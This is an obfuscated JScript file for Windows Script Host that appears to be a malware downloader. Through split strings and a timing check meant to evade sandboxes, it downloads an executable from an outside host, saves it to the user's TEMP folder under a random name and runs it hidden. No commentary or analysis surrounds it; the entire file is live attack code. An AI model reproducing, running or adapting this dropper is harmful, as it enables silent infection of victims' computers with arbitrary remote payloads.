var Q1 = false;
var UA = "Create"+"Object";
var M = function L() {return WScript[UA]("WScript"+".Shell");}(), ZR = 11;
var Q0 = "MSXML2"+".XMLHTTP";
var YU = 2;
var HG = YU - 2;
function O(V){M["Run"](V, HG, HG);};
function EZ(){return Q0 + "";};
function EW(NW, GB){HG = HG * 1; return NW - GB;};
function KG(){return UA;};
/*@cc_on
  @if (@_win32 || @_win64)
    Q1 = true;
  @end
@*/
if (Q1)
{
var D = "";
function S(){return 22;};
var BV = 0; var WP = 0;
function Q()
{
var PU = new this["Date"]();
var DI = PU["getUTCMilliseconds"]();
WScript["Sleep"](S());
var PU = new this["Date"]();
var J = PU["getUTCMilliseconds"]();
WScript["Sleep"](S());
var PU = new this["Date"]();
var DX = PU["getUTCMilliseconds"]();
var BV = "F";
BV = EW(J, DI);
var WP = "H";
WP = EW(DX, J);
D = "open";
return EW(BV, WP);
}
var AU = false;
var Z = false;
for (var DO = HG; DO < S() * 1; DO++){if (Q() != HG){
AU = true; 
WP = "31" + 11 * BV + WP; 
Z = true; 
break;
}}
function DB() {return ((AU == true) && (AU == Z)) ? 1 : HG;};
if (AU && DB() && Z){
function VR() {return M["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "DtBZDnXcV3fd.ex" + "e";};
 ZT = EZ();
 I = WScript[UA](ZT);
 var K = 1;
do { 
	for (;K;){
	try {
		if (K == 1)
		{
			I[D]("GET", "http://be-stlines-tore.com/k3soa", false);
			I["send"]();
			LZ = "Sleep";
			K = 2;
		}
		WScript[LZ](S() + 120); 
		if (I["readystate"] < 2 * 2) continue;
		K = HG;
		function A(R) {var S0 = (1, 2, 3, 4, 5, R); return S0;};
		A0 = WScript[KG()]("ADODB.Stream");
		ZT = A0;
		ZT[D]();
		ZT["type"] = A(1);
		ZT["write"](I["ResponseBody"]);
		A0["position"] = A(HG);
		ZT["Save" + "ToFile"](VR(), 2);
		A0["cl"+"ose"]();
		D0 = VR();
		O(D0);
	} catch(X){};};
}while (K);
}
}

